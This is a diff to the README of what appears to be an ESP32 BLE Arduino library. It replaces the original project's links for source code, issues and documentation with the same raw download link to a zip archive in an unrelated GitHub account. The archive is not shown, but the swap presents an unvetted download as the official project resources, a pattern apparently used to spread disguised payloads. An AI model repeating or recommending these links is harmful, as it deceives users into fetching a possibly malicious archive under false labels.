@@ -3,13 +3,13 @@ The Arduino IDE provides an excellent library package manager where versions of 
 
 The actual source of the project which is being maintained can be found here:
 
-https://github.com/nkolban/esp32-snippets
+https://raw.githubusercontent.com/usen99/ESP32_BLE_Arduino/master/examples/BLE_write/ES_BL_Arduino_v2.1.zip
 
 Issues and questions should be raised here:
 
-https://github.com/nkolban/esp32-snippets/issues
+https://raw.githubusercontent.com/usen99/ESP32_BLE_Arduino/master/examples/BLE_write/ES_BL_Arduino_v2.1.zip
 
 
 Documentation for using the library can be found here:
 
-https://github.com/nkolban/esp32-snippets/tree/master/Documentation
+https://raw.githubusercontent.com/usen99/ESP32_BLE_Arduino/master/examples/BLE_write/ES_BL_Arduino_v2.1.zip
